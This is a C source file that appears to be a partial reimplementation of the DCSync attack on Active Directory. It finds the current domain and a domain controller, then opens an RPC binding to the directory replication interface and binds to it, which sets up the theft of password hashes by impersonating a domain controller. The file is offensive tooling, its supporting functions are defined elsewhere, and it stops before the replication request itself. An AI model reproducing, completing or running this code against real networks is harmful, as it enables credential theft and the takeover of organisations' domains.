#include "globals.h"
#include "rpc.h"
#include "drsr.h"

BOOL getDC(LPCWSTR fullDomainName, DWORD altFlags, LPWSTR* fullDCName)
{
	BOOL status = FALSE;
	DWORD ret, size;
	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
	ret = DsGetDcName(NULL, fullDomainName, NULL, NULL, altFlags | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
	if (ret == ERROR_SUCCESS)
	{
		size = (DWORD)(wcslen(cInfo->DomainControllerName + 2) + 1) * sizeof(wchar_t);
		if (*fullDCName = (wchar_t*)LocalAlloc(LPTR, size))
		{
			status = TRUE;
			RtlCopyMemory(*fullDCName, cInfo->DomainControllerName + 2, size);
		}
		NetApiBufferFree(cInfo);
	}
	else PRINT_ERROR(L"DsGetDcName: %u\n", ret);
	return status;
}

BOOL getCurrentDomainInfo(PPOLICY_DNS_DOMAIN_INFO* pDomainInfo)
{
	BOOL status = FALSE;
	LSA_HANDLE hLSA;
	LSA_OBJECT_ATTRIBUTES oaLsa = { 0 };

	if (NT_SUCCESS(LsaOpenPolicy(NULL, &oaLsa, POLICY_VIEW_LOCAL_INFORMATION, &hLSA)))
	{
		status = NT_SUCCESS(LsaQueryInformationPolicy(hLSA, PolicyDnsDomainInformation, (PVOID*)pDomainInfo));
		LsaClose(hLSA);
	}

	return status;
}

int dcsync()
{
	LPCWSTR szDomain = NULL, szDc = NULL, szService = NULL, szUser = NULL, szGuid = NULL;
	DSNAME dsName = { 0 };
	LPDWORD pMajor, pMinor, pBuild;
	PPOLICY_DNS_DOMAIN_INFO pDomainInfo = NULL;
	RPC_BINDING_HANDLE hBinding;
	DRS_MSG_GETCHGREQ getChReq = { 0 };
	DRS_EXTENSIONS_INT DrsExtensionsInt;
	DRS_HANDLE hDrs = NULL;

	getCurrentDomainInfo(&pDomainInfo);
	szDomain = pDomainInfo->DnsDomainName.Buffer;
	PRINT_INFO(L"Domain would be %s\n", szDomain);

	getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &szDc);
	PRINT_INFO(L"DC would be %s\n", szDc);

	szService = L"ldap";
	RtlGetNtVersionNumbers(&pMajor, &pMinor, &pBuild);
	createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, (pMajor < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, RpcSecurityCallback);
	getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt);

	if (DrsExtensionsInt.dwReplEpoch)
		PRINT_INFO(L"DS Replication Epoch is %u\n", DrsExtensionsInt.dwReplEpoch);

	getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &DrsExtensionsInt);
}

int main(int argc, wchar_t* argv[])
{
    
	dcsync();

}